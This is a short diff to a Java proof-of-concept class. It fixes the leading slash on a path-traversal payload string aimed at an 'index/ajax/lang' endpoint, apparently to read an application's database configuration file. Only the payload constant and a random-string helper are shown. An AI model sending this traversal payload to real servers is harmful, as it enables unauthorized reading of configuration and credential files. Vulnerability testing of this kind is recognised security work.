@@ -18,7 +18,7 @@ import java.util.regex.Pattern;
 public class Poc {
     public String url= "";
     public String ip = "";
-    static String payload_1 = "index/ajax/lang?lang=..//..//application/database";
+    static String payload_1 = "/index/ajax/lang?lang=..//..//application/database";
 
     public static String getRandomString(){
         String str="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
